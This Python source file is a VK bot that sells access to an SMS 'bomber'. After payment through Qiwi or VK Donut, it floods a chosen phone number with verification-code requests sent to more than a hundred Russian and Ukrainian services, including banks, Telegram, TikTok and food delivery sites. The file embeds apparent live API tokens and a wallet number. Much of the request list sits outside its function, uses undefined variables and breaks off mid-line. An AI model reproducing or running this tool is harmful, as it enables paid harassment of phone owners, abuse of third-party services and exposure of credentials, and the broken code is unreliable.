try:
    import vk_api, requests, time, threading, filemath, fake_useragent, os
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id
    from vk_api.keyboard import VkKeyboard, VkKeyboardColor

    print("Бот готов получать бабки!")
    keyboard = VkKeyboard(one_time=False)
    # 1
    keyboard.add_button('Bomber 💣', color=VkKeyboardColor.PRIMARY)
    keyboard.add_button('Поддержка 👤', color=VkKeyboardColor.PRIMARY)
    keyboard.add_line()
    keyboard.add_button('Баланс 💰', color=VkKeyboardColor.PRIMARY)
    keyboard.add_button('Пополнить 💳', color=VkKeyboardColor.PRIMARY)

    clava2 = VkKeyboard(one_time=False)
    clava2.add_button('Оплата Qiwi 🥝', color=VkKeyboardColor.PRIMARY)
    clava2.add_line()
    clava2.add_openlink_button('Другие способы', link='https://vk.com/bomberru?w=app6887721_-179699905')
    clava2.add_line()
    clava2.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

    clava3 = VkKeyboard(one_time=False)
    clava3.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

    clava4 = VkKeyboard(one_time=False)
    clava4.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

    clava5 = VkKeyboard(one_time=False)
    clava5.add_openlink_button('Оплатить', link='https://qiwi.com/payment/form/99?amountFraction=00&currency=RUB&extra%5B%27account%27%5D=375296551581')
    clava5.add_line()
    clava5.add_button('Назад ↩', color=VkKeyboardColor.PRIMARY)

    clava6 = VkKeyboard(one_time=False)
    clava6.add_button('Запустить', color=VkKeyboardColor.POSITIVE)
    clava6.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

    def check(x):
        file = open('baza.txt', 'r', encoding='utf-8')
        if str(x) in file.read():
            return 1
        else:
            return 0
        file.close()


    def adder(x):
        file = open('baza.txt', 'a', encoding='utf-8')
        file.write(f'{x}\n')

        file.close()


    UsersId = open("baza.txt", "r")
    UsersId2 = set()
    for line in UsersId:
        UsersId2.add(line.strip())
    UsersId.close()

    suser = []
    for user in UsersId2:
        suser.append(str(user))


    def extract_aarg(aarg):
        return aarg.split()[0]


    def extract_arg(arg):
        return arg.split()[1]


    def extract_arg2(arg2):
        return arg2.split()[2]


    def payment_history_last(my_login, api_access_token, rows_num, next_TxnId, next_TxnDate):
        # сессия для рекуест
        s = requests.Session()
        # добавляем рекуесту headers
        s.headers['authorization'] = 'Bearer ' + api_access_token
        # параметры
        parameters = {'rows': rows_num, 'nextTxnId': next_TxnId, 'nextTxnDate': next_TxnDate}
        # через рекуест получаем платежы с параметрами - parameters
        h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + my_login + '/payments', params=parameters)
        # обязательно json все объекты в киви апи json
        return h.json()


    mylogin = '375296551581'
    api_access_token = '13517c96c7e5464cffd881e1906bd6d6'





    def Donat():
        while True:
            time.sleep(20)
            user = fake_useragent.UserAgent().random
            headers = {'user_agent': user}
            r = requests.get('https://api.vkdonuts.ru/donates/get', headers=headers,
                              json={'group': '179699905', 'token': 'eebed2afe6f5ec6575f7a55eda9af596ae2a99ec73471a5868',
                                    'v': '1', 'len': 1})
            r = r.json()
            time.sleep(20)
            sum = r['list'][0]['amount']
            txnId = r['list'][0]['date']
            comm = r['list'][0]['user']

            a = open("donat.txt", "r")
            lastpay = a.read()
            lastpay = str(lastpay)
            a.close()

            if lastpay == txnId:
                pass
            else:
                try:
                    a = open(str(comm) + ".txt", "r")
                    a.close()
                    filemath.pmms(str(comm) + ".txt", "+" + str(sum))

                    a = open("donat.txt", 'w')
                    a.write(txnId)
                    a.close()
                    write_message(int(comm), "На ваш баланс зачисленно " + str(sum) + "р\n\nУдачных покупок!")
                except:
                    pass


    Don = threading.Thread(target=Donat)
    Don.start()


    def QiwiCheck(number, api):
        while True:
            time.sleep(30)
            lastPayments = payment_history_last(number, api, '1', '', '')

            num = lastPayments['data'][0]['account']
            sum = lastPayments['data'][0]['sum']['amount']
            comm = lastPayments['data'][0]['comment']
            type = lastPayments['data'][0]['type']
            txnId = lastPayments['data'][0]['txnId']
            txnId = str(txnId)

            a = open("thlp.txt", "r")
            lastpay = a.read()
            lastpay = str(lastpay)
            a.close()

            if lastpay == txnId:
                pass
            else:
                try:
                    a = open(str(comm[1:]) + ".txt", "r")
                    a.close()
                    filemath.pmms(str(comm[1:]) + ".txt", "+" + str(sum))

                    a = open("thlp.txt", 'w')
                    a.write(txnId)
                    a.close()

                    write_message(int(comm[1:]), "На ваш баланс зачисленно " + str(sum) + "р\n\nУдачных покупок!")

                except:
                    pass


    Tqiwi = threading.Thread(target=QiwiCheck, args=(mylogin, api_access_token))
    Tqiwi.start()

    def bomber(phone, vremya, dds, ddss):
        x = 0
        user = fake_useragent.UserAgent().random
        headers = {'user_agent': user}
        v = int(vremya) * 10
        while x < v:
            x += 1
            try:
                requests.post(
                    "https://api.delitime.ru/api/v2/signup",
                    data={
                        "SignupForm[username]": phone,
                        "SignupForm[device_type]": 3,
                    },
                )

            except:
                pass
            try:
                a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
                                  headers=headers)
            except:
                pass
            try:
                a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                                  json={"reqId": "91101-1606335718",
                                        "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                                   "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                                  headers=headers)
            except:
                pass
            try:
                a = requests.post("https://youla.ru/web-api/auth/request_code",
                                  json={"phone": phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763"
                }, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                                  json={"phone_number": phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                                  data={"phone": phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post(
                    "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                    data={"st.r.phone": "+" + phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://nn-card.ru/api/1.0/register",
                                  json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  json={"CellPhone": phone[1:]}, headers=headers)
            except:
                pass
            try:
                a = requests.post(
                    "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                    data={"phone": "+" + phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post(
                    "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                    data={"l": phone[1:]}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                                  data={"CellPhone": phone[1:]}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                                  json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                        "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
                                  headers=headers)
            except:
                pass
            try:
                a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                                  json={"phone": phone[1:], "name": "Егор"}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                                  json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                        "Mobile": phone[1:],
                                        "page": {"pageName": "home", "launchMode": "direct",
                                                 "trafficType": ""}},
                                  headers=headers)
            except:
                pass
            try:
                a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
                                  data={"phone": phone},
                                  headers=headers)
            except:
                pass
            try:
                a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                                  json={
                                      "phone": "+" + phone,
                                      "api": 2,
                                      "email": 'dgirherfib@gmaqil.com',
                                      "x-email": "x-email",
                                  }, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                                  data={
                                      "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                      "username": phone,
                                      "client_id": "android-qw",
                                      "client_secret": "zAm4FKq9UnSe7id",
                                  }, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                                  json={"phone": "+" + phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                                  json={
                                      "birthday": {"day": 12, "month": 10, "year": 2000},
                                      "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                      "include_verification_code": True,
                                      "password": 'Danil5564554',
                                      "phone_number": phone,
                                      "username": 'bhtrtrrrtbhtrbhtr',
                                  }, headers=headers)
            except:
                pass
            try:
                a = requests.post("https://my.telegram.org/auth/send_password",
                                  data={"phone": "+" + phone}, headers=headers)
            except:
                pass
            try:
                a = requests.post(
                    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                    params={'msisdn': phone}, headers=headers)
            except:
                pass              
    try:
        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone[1:], maska="8(###)###-##-##")
        requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonemas, "code":""})
    except:
        pass
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""})
    except:
        pass
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
        requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"})
    except:
        pass
    try:
        # под сомнением
        phonemas=mask(str=phone, maska="#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonemas})

        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"})
    except:
        pass
    try:
        requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
    except:
        pass
    try:
        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="8(###)###-##-##")
        requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
    except:
        pass
    try:
        requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
    except:
        pass
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
    except:
        pass
    try:
        phonemas=mask(phone, maska="+# (###) ### - ## - ##")
        requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
    except:
        pass
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="(+#)##########")
        requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonemas, "type": 1}})
    except:
        pass
    try:
        requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
    except:
        pass
    try:
        requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
    except:
        pass
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
    except:
        pass
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8(###)###-##-##")
        requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.post("http://sushigourmet.ru/auth",data={"phone": phonemas, "stage": 1})
    except:
        pass
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
    except:
        pass
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
    except:
        pass
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
    except:
        pass
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonemas})
    except:
        pass
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
    except:
        pass
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
    except:
        pass
    try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
    except:
        pass
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
    except:
        pass
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
    except:
        pass
    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
    except:
        pass
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
    except:
        pass
    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonemas, "alien": "0"})
    except:
        pass
    try:
        requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
    except:
        pass
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
    except:
        pass
    try:
        requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
    except:
        pass
    try:
        requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonemas}})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonemas})
    except:
        pass
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
    except:
        pass
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://paylate.ru/registry",data={"mobile": phonemas,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
    except:
        pass
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
    except:
        pass
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonemas})
    except:
        pass
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
    except:
        pass
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
    except:
        pass
    try:
        requests.post(
            "https://www.ollis.ru/gql",
            json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonemas,"call_time": "1","pravila2": "on"})
    except:
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
    except:
        pass
    try:
        requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
    except:
        pass
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
    except:
        pass
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://auth.multiplex.ua/login", json={"login": phone})
    except:
        pass
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
    except:
        pass
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
    except:
        pass
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
    except:
        pass
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
    except:
        pass
    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
    except:
        pass
    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
    except:
        pass
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ### ## ##")
        requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonemas)
    except:
        pass
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
    except:
        pass
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
    except:
        pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# ### ### ## ##")
        requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="# (###) ###-##-##")
        requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonemas })
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
    except:
        pass
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phonemas})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonemas,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonemas,"g-recaptcha-response": None})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
